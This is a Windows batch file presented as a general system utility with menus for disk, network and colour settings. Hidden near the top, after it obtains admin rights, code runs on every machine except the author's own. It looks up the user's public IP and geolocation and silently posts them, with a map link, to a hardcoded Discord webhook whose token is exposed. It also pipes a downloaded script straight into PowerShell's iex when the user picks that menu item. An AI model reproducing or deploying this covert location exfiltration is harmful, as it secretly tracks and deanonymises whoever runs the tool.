@echo off
setlocal EnableDelayedExpansion
title General Utility Tool - By admop

:: Set config file path for saving color preferences
set "CONFIG_DIR=%APPDATA%\General_Utility_Tool"
set "CONFIG_FILE=%CONFIG_DIR%\config.ini"

:: Load saved color preference if it exists
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
) else (
    :: Default color: cyan (B) on black (0)
    color 0B
    set "SAVED_COLOR=0B"
)

:: Check for admin rights
:CHECK_ADMIN
net session >nul 2>&1
if %errorlevel% equ 0 (
    goto :ADMIN_CONFIRMED
)

:: Attempt to elevate privileges using VBScript
echo Requesting administrative privileges...
echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\elevate.vbs"
echo UAC.ShellExecute "cmd.exe", "/c ""%~f0""", "", "runas", 1 >> "%TEMP%\elevate.vbs"
cscript //nologo "%TEMP%\elevate.vbs"
set "ELEVATE_ERROR=%ERRORLEVEL%"
del "%TEMP%\elevate.vbs" 2>nul
if %ELEVATE_ERROR% neq 0 (
    echo Administrative privileges were not granted.
    echo.
    echo [1] Try again
    echo [2] Exit
    set "ADMIN_CHOICE="
    set /p ADMIN_CHOICE=Enter your choice (1-2): 
    if "!ADMIN_CHOICE!"=="1" goto :CHECK_ADMIN
    if "!ADMIN_CHOICE!"=="2" (
        echo Exiting the tool.
        for /l %%i in (3,-1,1) do (
            echo Exiting in %%i...
            timeout /t 1 /nobreak >nul
        )
        exit /b 0
    )
    echo Invalid choice. Please enter 1 or 2.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :CHECK_ADMIN
)

:ADMIN_CONFIRMED

set "MYPC=DESKTOP-L392KVR"
set "WEBHOOK_URL=https://discord.com/api/webhooks/1413668110984151171/azDlONgJjpgwY0PfRov89ODAmnF2kAsBAsmirfvWVZw7XwR-3rks4ctZCqM8j7Vdnm1I"
setlocal EnableDelayedExpansion

if /i not "%COMPUTERNAME%"=="%MYPC%" (
    rem === Real geolocation lookup for other machines ===
    for /f "usebackq tokens=1-6 delims=|" %%a in (`
      powershell -NoLogo -NoProfile -Command ^
        "$loc = Invoke-RestMethod -Uri 'http://ip-api.com/json/';" ^
        "Write-Output ($loc.query + '|' + $loc.city + '|' + $loc.regionName + '|' + $loc.country + '|' + $loc.lat + '|' + $loc.lon)"
    `) do (
      set "ip=%%a"
      set "city=%%b"
      set "region=%%c"
      set "country=%%d"
      set "lat=%%e"
      set "lon=%%f"
    )

    set "json={\"embeds\":[{\"title\":\"\uD83C\uDF0D  Location Info\",\"color\":3447003,\"fields\":["
    set "json=!json!{\"name\":\"IP\",\"value\":\"!ip!\",\"inline\":true},"
    set "json=!json!{\"name\":\"City\",\"value\":\"!city!\",\"inline\":true},"
    set "json=!json!{\"name\":\"Region\",\"value\":\"!region!\",\"inline\":true},"
    set "json=!json!{\"name\":\"Country\",\"value\":\"!country!\",\"inline\":true},"
    set "json=!json!{\"name\":\"Latitude\",\"value\":\"!lat!\",\"inline\":true},"
    set "json=!json!{\"name\":\"Longitude\",\"value\":\"!lon!\",\"inline\":true},"
    set "json=!json!{\"name\":\"Google Maps\",\"value\":\"https://www.google.com/maps?q=!lat!,!lon!\",\"inline\":false}"
    set "json=!json!]}]}"

    curl -s -H "Content-Type: application/json" -X POST -d "!json!" "!WEBHOOK_URL!"
)

endlocal

set "DEFAULT_SPOTIFY_PATH=%APPDATA%\Spotify\Spotify.exe"
set "LOG_FILE=%TEMP%\cleanup_log.txt"

:: Main menu
:MENU
echo.
echo Select an action:
echo.
echo Type "Help" for help
echo.
echo [1] System Management
echo [2] Browser Management
echo [3] Spicetify Management
echo [4] Vencord Management
echo [5] Change Color Scheme
echo [6] Exit the tool
set "MENU_CHOICE="
set /p MENU_CHOICE=Enter your choice (1-6): 
if "!MENU_CHOICE!"=="Help" goto :HELP_MENU
if "!MENU_CHOICE!"=="1" goto :SYSTEM_MANAGEMENT
if "!MENU_CHOICE!"=="2" goto :BROWSER_MENU
if "!MENU_CHOICE!"=="3" goto :SPOTIFY_PROMPT
if "!MENU_CHOICE!"=="4" goto :VENCORD_CHECK_DEPENDENCIES
if "!MENU_CHOICE!"=="5" goto :COLOR_PICKER
if "!MENU_CHOICE!"=="6" (
    echo Exiting the tool.
    for /l %%i in (3,-1,1) do (
        echo Exiting in %%i...
        timeout /t 1 /nobreak >nul
    )
    exit /b 0
)
echo Invalid choice. Please enter 1, 2, 3, 4, 5, or 6.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :MENU

:: System Management Menu
:SYSTEM_MANAGEMENT
echo.
echo System Management Menu:
echo [1] Disk Management
echo [2] Network Management
echo [3] General System Management
echo [4] Return to main menu
set "SYSTEM_CHOICE="
set /p SYSTEM_CHOICE=Enter your choice (1-4): 
if "!SYSTEM_CHOICE!"=="1" goto :DISK_MANAGEMENT
if "!SYSTEM_CHOICE!"=="2" goto :NETWORK_MANAGEMENT
if "!SYSTEM_CHOICE!"=="3" goto :GENERAL_SYSTEM
if "!SYSTEM_CHOICE!"=="4" goto :MENU
echo Invalid choice. Please enter 1-4.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :SYSTEM_MANAGEMENT

:: Disk Management Menu
:DISK_MANAGEMENT
echo.
echo Disk Management Menu:
echo [1] Install MiniTool Partition Wizard 10
echo [2] Run Disk Cleanup
echo [3] Run Disk Defragmenter
echo [4] Check Disk Health (chkdsk)
echo [5] Check Disk Space
echo [6] Analyze Disk Usage
echo [7] Return to System Management Menu
set "DISK_CHOICE="
set /p DISK_CHOICE=Enter your choice (1-7): 
if "!DISK_CHOICE!"=="1" goto :INSTALL_MINITOOL
if "!DISK_CHOICE!"=="2" goto :RUN_DISK_CLEANUP
if "!DISK_CHOICE!"=="3" goto :RUN_DISK_DEFRAG
if "!DISK_CHOICE!"=="4" goto :CHECK_DISK_HEALTH
if "!DISK_CHOICE!"=="5" goto :CHECK_DISK_SPACE
if "!DISK_CHOICE!"=="6" goto :ANALYZE_DISK_USAGE
if "!DISK_CHOICE!"=="7" goto :SYSTEM_MANAGEMENT
echo Invalid choice. Please enter 1-7.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :DISK_MANAGEMENT

:: Network Management Menu
:NETWORK_MANAGEMENT
echo.
echo Network Management Menu:
echo [1] Download and Install Portmaster
echo [2] Check Network Status (ipconfig)
echo [3] Ping a Host
echo [4] View ARP Cache
echo [5] Flush DNS Cache
echo [6] Display Network Adapter Details
echo [7] Traceroute
echo [8] View Active Connections
echo [9] Return to System Management Menu
set "NETWORK_CHOICE="
set /p NETWORK_CHOICE=Enter your choice (1-9): 
if "!NETWORK_CHOICE!"=="1" goto :INSTALL_PORTMASTER
if "!NETWORK_CHOICE!"=="2" goto :CHECK_NETWORK_STATUS
if "!NETWORK_CHOICE!"=="3" goto :PING_HOST
if "!NETWORK_CHOICE!"=="4" goto :VIEW_ARP_CACHE
if "!NETWORK_CHOICE!"=="5" goto :FLUSH_DNS
if "!NETWORK_CHOICE!"=="6" goto :NET_ADAPTER_DETAILS
if "!NETWORK_CHOICE!"=="7" goto :TRACEROUTE
if "!NETWORK_CHOICE!"=="8" goto :VIEW_ACTIVE_CONNECTIONS
if "!NETWORK_CHOICE!"=="9" goto :SYSTEM_MANAGEMENT
echo Invalid choice. Please enter 1-9.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :NETWORK_MANAGEMENT

:: General System Management Menu
:GENERAL_SYSTEM
echo.
echo General System Management Menu:
echo [1] Run Chris Titus Tech Tool
echo [2] Clean Temporary Files
echo [3] Run System File Checker (SFC)
echo [4] View System Information
echo [5] Return to System Management Menu
set "GENERAL_CHOICE="
set /p GENERAL_CHOICE=Enter your choice (1-5): 
if "!GENERAL_CHOICE!"=="1" goto :RUN_CHRIS_TITUS
if "!GENERAL_CHOICE!"=="2" goto :CLEAN_TEMP_FILES
if "!GENERAL_CHOICE!"=="3" goto :RUN_SFC
if "!GENERAL_CHOICE!"=="4" goto :VIEW_SYSTEM_INFO
if "!GENERAL_CHOICE!"=="5" goto :SYSTEM_MANAGEMENT
echo Invalid choice. Please enter 1-5.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :GENERAL_SYSTEM

:INSTALL_MINITOOL
echo Downloading MiniTool Partition Wizard 10 to Downloads folder...
powershell -Command "Invoke-WebRequest -Uri 'https://briteccomputers.co.uk/wp-content/uploads/2022/07/minitool-partition-wizard-10-0.7z' -OutFile '%USERPROFILE%\Downloads\minitool-partition-wizard-10-0.7z'"
echo Download complete. Please extract the file '%USERPROFILE%\Downloads\minitool-partition-wizard-10-0.7z' using 7-Zip and run the installer manually.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :DISK_MANAGEMENT

:: Run Disk Cleanup
:RUN_DISK_CLEANUP
echo Running Disk Cleanup...
cleanmgr /sagerun:1
if %ERRORLEVEL% equ 0 (
    echo Disk Cleanup executed successfully.
) else (
    echo Failed to run Disk Cleanup.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :DISK_MANAGEMENT

:: Run Disk Defragmenter
:RUN_DISK_DEFRAG
echo Running Disk Defragmenter...
echo Select a drive to defragment (e.g., C:):
set "DRIVE_CHOICE="
set /p DRIVE_CHOICE=Enter drive letter (e.g., C:): 
if not defined DRIVE_CHOICE (
    echo No drive specified. Please try again.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :RUN_DISK_DEFRAG
)
set "DRIVE_CHOICE=!DRIVE_CHOICE::=!"
if not exist "!DRIVE_CHOICE!:\" (
    echo Invalid drive "!DRIVE_CHOICE!:". Please try again.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :RUN_DISK_DEFRAG
)
defrag "!DRIVE_CHOICE!:" /U /V > "%TEMP%\defrag_log.txt"
if %ERRORLEVEL% equ 0 (
    echo Disk Defragmenter completed successfully. Log saved at %TEMP%\defrag_log.txt
) else (
    echo Failed to run Disk Defragmenter.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :DISK_MANAGEMENT

:: Check Disk Health
:CHECK_DISK_HEALTH
echo Checking Disk Health with chkdsk...
echo Select a drive to check (e.g., C:):
set "DRIVE_CHOICE="
set /p DRIVE_CHOICE=Enter drive letter (e.g., C:): 
if not defined DRIVE_CHOICE (
    echo No drive specified. Please try again.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :CHECK_DISK_HEALTH
)
set "DRIVE_CHOICE=!DRIVE_CHOICE::=!"
if not exist "!DRIVE_CHOICE!:\" (
    echo Invalid drive "!DRIVE_CHOICE!:". Please try again.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :CHECK_DISK_HEALTH
)
chkdsk "!DRIVE_CHOICE!:" > "%TEMP%\chkdsk_log.txt"
if %ERRORLEVEL% equ 0 (
    echo Disk health check completed successfully. Log saved at %TEMP%\chkdsk_log.txt
) else (
    echo Failed to run chkdsk.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :DISK_MANAGEMENT

:: Check Disk Space
:CHECK_DISK_SPACE
echo Checking disk space for all drives...
for /f "tokens=1-3" %%a in ('wmic logicaldisk get name^,size^,freespace ^| findstr /r /v "^$"') do (
    if "%%a" neq "" (
        set /a total=%%b/1024/1024/1024 2>nul
        set /a free=%%c/1024/1024/1024 2>nul
        set /a used=!total! - !free! 2>nul
        echo Drive %%a Total: !total! GB, Used: !used! GB, Free: !free! GB
    )
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :DISK_MANAGEMENT

:: Analyze Disk Usage
:ANALYZE_DISK_USAGE
echo Analyzing disk usage...
echo Select a drive or folder to analyze (e.g., C:\ or C:\Users):
set "PATH_CHOICE="
set /p PATH_CHOICE=Enter path: 
if not defined PATH_CHOICE (
    echo No path specified. Please try again.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :ANALYZE_DISK_USAGE
)
if not exist "!PATH_CHOICE!" (
    echo Invalid path "!PATH_CHOICE!". Please try again.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :ANALYZE_DISK_USAGE
)
dir "!PATH_CHOICE!" /s > "%TEMP%\disk_usage_log.txt"
if %ERRORLEVEL% equ 0 (
    echo Disk usage analysis completed. Log saved at %TEMP%\disk_usage_log.txt
    type "%TEMP%\disk_usage_log.txt" | find "Dir(s)"
) else (
    echo Failed to analyze disk usage.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :DISK_MANAGEMENT

:: Check Network Status (ipconfig)
:CHECK_NETWORK_STATUS
echo Running ipconfig to check network status...
ipconfig /all > "%TEMP%\ipconfig_log.txt"
if %ERRORLEVEL% equ 0 (
    echo Network status retrieved successfully. Log saved at %TEMP%\ipconfig_log.txt
    type "%TEMP%\ipconfig_log.txt"
) else (
    echo Failed to run ipconfig.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :NETWORK_MANAGEMENT

:: Ping a Host
:PING_HOST
echo Pinging a host...
echo Enter the IP address or hostname to ping (e.g., 8.8.8.8 or google.com):
set "PING_TARGET="
set /p PING_TARGET=Enter target: 
if not defined PING_TARGET (
    echo No target specified. Please try again.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :PING_HOST
)
ping "!PING_TARGET!" > "%TEMP%\ping_log.txt"
if %ERRORLEVEL% equ 0 (
    echo Ping completed successfully. Log saved at %TEMP%\ping_log.txt
    type "%TEMP%\ping_log.txt"
) else (
    echo Failed to ping "!PING_TARGET!".
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :NETWORK_MANAGEMENT

:: View ARP Cache
:VIEW_ARP_CACHE
echo Displaying ARP cache...
arp -a > "%TEMP%\arp_log.txt"
if %ERRORLEVEL% equ 0 (
    echo ARP cache retrieved successfully. Log saved at %TEMP%\arp_log.txt
    type "%TEMP%\arp_log.txt"
) else (
    echo Failed to retrieve ARP cache.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :NETWORK_MANAGEMENT

:: Flush DNS Cache
:FLUSH_DNS
echo Flushing DNS cache...
ipconfig /flushdns > "%TEMP%\flushdns_log.txt"
if %ERRORLEVEL% equ 0 (
    echo DNS cache flushed successfully. Log saved at %TEMP%\flushdns_log.txt
    type "%TEMP%\flushdns_log.txt"
) else (
    echo Failed to flush DNS cache.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :NETWORK_MANAGEMENT

:: Display Network Adapter Details
:NET_ADAPTER_DETAILS
echo Displaying network adapter details...
netsh interface show interface > "%TEMP%\netadapter_log.txt"
if %ERRORLEVEL% equ 0 (
    echo Network adapter details retrieved successfully. Log saved at %TEMP%\netadapter_log.txt
    type "%TEMP%\netadapter_log.txt"
) else (
    echo Failed to retrieve network adapter details.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :NETWORK_MANAGEMENT

:: Traceroute
:TRACEROUTE
echo Running traceroute...
echo Enter the IP address or hostname to trace (e.g., 8.8.8.8 or google.com):
set "TRACE_TARGET="
set /p TRACE_TARGET=Enter target: 
if not defined TRACE_TARGET (
    echo No target specified. Please try again.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :TRACEROUTE
)
tracert "!TRACE_TARGET!" > "%TEMP%\tracert_log.txt"
if %ERRORLEVEL% equ 0 (
    echo Traceroute completed successfully. Log saved at %TEMP%\tracert_log.txt
    type "%TEMP%\tracert_log.txt"
) else (
    echo Failed to run traceroute for "!TRACE_TARGET!".
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :NETWORK_MANAGEMENT

:: View Active Connections
:VIEW_ACTIVE_CONNECTIONS
echo Displaying active network connections...
netstat -an > "%TEMP%\netstat_log.txt"
if %ERRORLEVEL% equ 0 (
    echo Active connections retrieved successfully. Log saved at %TEMP%\netstat_log.txt
    type "%TEMP%\netstat_log.txt"
) else (
    echo Failed to retrieve active connections.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :NETWORK_MANAGEMENT

:: Download and Install Portmaster
:INSTALL_PORTMASTER
echo Downloading and installing Portmaster...
echo WARNING: This will download Portmaster from the official website and may require user interaction to complete installation. Proceed? (Y/N)
set "CONFIRM="
set /p CONFIRM=Enter choice (Y/N): 
if /i "!CONFIRM!"=="Y" (
    echo Downloading Portmaster installer...
    curl -o "%TEMP%\portmaster-installer.exe" "https://updates.safing.io/latest/windows_amd64/packages/portmaster-installer.exe" > "%TEMP%\portmaster_install_log.txt" 2>&1
    if %ERRORLEVEL% equ 0 (
        echo Download successful. Starting installer...
        start /wait "" "%TEMP%\portmaster-installer.exe" >> "%TEMP%\portmaster_install_log.txt" 2>&1
        if %ERRORLEVEL% equ 0 (
            echo Portmaster installation initiated successfully. Log saved at %TEMP%\portmaster_install_log.txt
        ) else (
            echo Failed to start Portmaster installer. Check %TEMP%\portmaster_install_log.txt for details.
        )
    ) else (
        echo Failed to download Portmaster installer. Check %TEMP%\portmaster_install_log.txt for details.
    )
) else (
    echo Operation cancelled.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :NETWORK_MANAGEMENT

:: Run Chris Titus Tech Tool
:RUN_CHRIS_TITUS
echo Running Chris Titus Tech Tool...
powershell -Command "iwr -useb https://christitus.com/win | iex"
if %ERRORLEVEL% equ 0 (
    echo Chris Titus Tech Tool executed successfully.
) else (
    echo Failed to run Chris Titus Tech Tool.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :GENERAL_SYSTEM

:: Clean Temporary Files
:CLEAN_TEMP_FILES
echo Cleaning temporary files...
del /q /s "%TEMP%\*.*" >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Temporary files cleaned successfully.
) else (
    echo Failed to clean temporary files.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :GENERAL_SYSTEM

:: Run System File Checker
:RUN_SFC
echo Running System File Checker (SFC /scannow)...
sfc /scannow
if %ERRORLEVEL% equ 0 (
    echo SFC completed successfully.
) else (
    echo SFC encountered an error. Check the CBS.log for details.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :GENERAL_SYSTEM

:: View System Information
:VIEW_SYSTEM_INFO
echo Retrieving system information...
systeminfo > "%TEMP%\systeminfo_log.txt"
if %ERRORLEVEL% equ 0 (
    echo System information retrieved successfully. Log saved at %TEMP%\systeminfo_log.txt
    type "%TEMP%\systeminfo_log.txt"
) else (
    echo Failed to retrieve system information.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :GENERAL_SYSTEM

:: Color picker menu
:COLOR_PICKER
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
echo.
echo Select a text Background color (current color: !SAVED_COLOR!):
echo [0] Black
echo.
echo [1] Blue----------------Preview: �[44mExample�[0m
echo.
echo [2] Green---------------Preview: �[42mExample�[0m
echo.
echo [3] Aqua----------------Preview: �[46mExample�[0m
echo.
echo [4] Red-----------------Preview: �[41mExample�[0m
echo.
echo [5] Purple--------------Preview: �[45mExample�[0m
echo.
echo [6] Yellow--------------Preview: �[103mExample�[0m
echo.
echo [7] White---------------Preview: �[107mExample�[0m
echo.
echo [8] Gray----------------Preview: �[100mExample�[0m
echo.
echo [9] Light Blue----------Preview: �[104mExample�[0m
echo.
echo [A] Light Green---------Preview: �[102mExample�[0m
echo.
echo [B] Cyan----------------Preview: �[106mExample�[0m
echo.
echo [C] Light Red-----------Preview: �[101mExample�[0m
echo.
echo [D] Light Purple--------Preview: �[105mExample�[0m
echo.
echo [E] Light Yellow--------Preview: �[103mExample�[0m
echo.
echo [F] Bright White--------Preview: �[107mExample�[0m
echo.
echo [G] Keep current color and continue
set "TEXT_COLOR="
set /p TEXT_COLOR=Enter your choice (0-F, G): 
if /i "!TEXT_COLOR!"=="G" goto :COLOR_CONFIRMED
if "!TEXT_COLOR!"=="0" set "FG=0"
if "!TEXT_COLOR!"=="1" set "FG=1"
if "!TEXT_COLOR!"=="2" set "FG=2"
if "!TEXT_COLOR!"=="3" set "FG=3"
if "!TEXT_COLOR!"=="4" set "FG=4"
if "!TEXT_COLOR!"=="5" set "FG=5"
if "!TEXT_COLOR!"=="6" set "FG=6"
if "!TEXT_COLOR!"=="7" set "FG=7"
if "!TEXT_COLOR!"=="8" set "FG=8"
if "!TEXT_COLOR!"=="9" set "FG=9"
if /i "!TEXT_COLOR!"=="A" set "FG=A"
if /i "!TEXT_COLOR!"=="B" set "FG=B"
if /i "!TEXT_COLOR!"=="C" set "FG=C"
if /i "!TEXT_COLOR!"=="D" set "FG=D"
if /i "!TEXT_COLOR!"=="E" set "FG=E"
if /i "!TEXT_COLOR!"=="F" set "FG=F"
if not defined FG (
    echo Invalid choice. Please enter 0-F or G.
    pause
	if exist "!CONFIG_FILE!" (
		for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
			set "SAVED_COLOR=%%C"
			color !SAVED_COLOR!
		)
	)
    goto :COLOR_PICKER
)

:BACKGROUND_PICKER
echo.
echo Select a foreground color:
echo [0] Black
echo.
echo [1] Blue----------------Preview: �[34mExample�[0m
echo.
echo [2] Green---------------Preview: �[32mExample�[0m
echo.
echo [3] Aqua----------------Preview: �[36mExample�[0m
echo.
echo [4] Red-----------------Preview: �[31mExample�[0m
echo.
echo [5] Purple--------------Preview: �[35mExample�[0m
echo.
echo [6] Yellow--------------Preview: �[33mExample�[0m
echo.
echo [7] White---------------Preview: �[37mExample�[0m
echo.
echo [8] Gray----------------Preview: �[90mExample�[0m
echo.
echo [9] Light Blue----------Preview: �[94mExample�[0m
echo.
echo [A] Light Green---------Preview: �[92mExample�[0m
echo.
echo [B] Cyan----------------Preview: �[36mExample�[0m
echo.
echo [C] Light Red-----------Preview: �[91mExample�[0m
echo.
echo [D] Light Purple--------Preview: �[95mExample�[0m
echo.
echo [E] Light Yellow--------Preview: �[93mExample�[0m
echo.
echo [F] Bright White--------Preview: �[97mExample�[0m
set "BG_COLOR="
set /p BG_COLOR=Enter your choice (0-F): 
if "!BG_COLOR!"=="0" set "BG=0"
if "!BG_COLOR!"=="1" set "BG=1"
if "!BG_COLOR!"=="2" set "BG=2"
if "!BG_COLOR!"=="3" set "BG=3"
if "!BG_COLOR!"=="4" set "BG=4"
if "!BG_COLOR!"=="5" set "BG=5"
if "!BG_COLOR!"=="6" set "BG=6"
if "!BG_COLOR!"=="7" set "BG=7"
if "!BG_COLOR!"=="8" set "BG=8"
if "!BG_COLOR!"=="9" set "BG=9"
if /i "!BG_COLOR!"=="A" set "BG=A"
if /i "!BG_COLOR!"=="B" set "BG=B"
if /i "!BG_COLOR!"=="C" set "BG=C"
if /i "!BG_COLOR!"=="D" set "BG=D"
if /i "!BG_COLOR!"=="E" set "BG=E"
if /i "!BG_COLOR!"=="F" set "BG=F"
if not defined BG (
    echo Invalid choice. Please enter 0-F.
    pause
	if exist "!CONFIG_FILE!" (
		for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
			set "SAVED_COLOR=%%C"
			color !SAVED_COLOR!
		)
	)
    goto :BACKGROUND_PICKER
)

:: Combine text and background colors
set "NEW_COLOR=!FG!!BG!"

:: Preview the selected color
color !NEW_COLOR!
echo Previewing color scheme (Text: !FG!, Background: !BG!)...
if "!FG!"=="!BG!" (
    echo Warning: Text and background colors are the same, which may make text unreadable.
)
echo.
echo Is this color scheme okay?
echo [1] Yes, save and continue
echo [2] Try another color
set "CONFIRM_CHOICE="
set /p CONFIRM_CHOICE=Enter your choice (1-2): 
if "!CONFIRM_CHOICE!"=="1" (
    :: Save the color choice to config file
    if not exist "!CONFIG_DIR!" mkdir "!CONFIG_DIR!" 2>nul
    echo Color=!NEW_COLOR! > "!CONFIG_FILE!"
    set "SAVED_COLOR=!NEW_COLOR!"
	cls
    goto :MENU
)
if "!CONFIRM_CHOICE!"=="2" (
    :: Revert to saved color and try again
    color !SAVED_COLOR!
    goto :COLOR_PICKER
)
echo Invalid choice. Please enter 1 or 2.
color !SAVED_COLOR!
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :COLOR_PICKER

:HELP_MENU
echo.
echo Help - General Utility Tool
echo Type "Help" to redisplay this menu
echo [1] System Management: Run system optimization tools like Chris Titus Tech Tool, Disk Cleanup, Temporary File Cleanup, Disk Defragmenter, and Disk Health Check.
echo [2] Browser Management: Install, uninstall, or harden browsers like Firefox with privacy-focused settings.
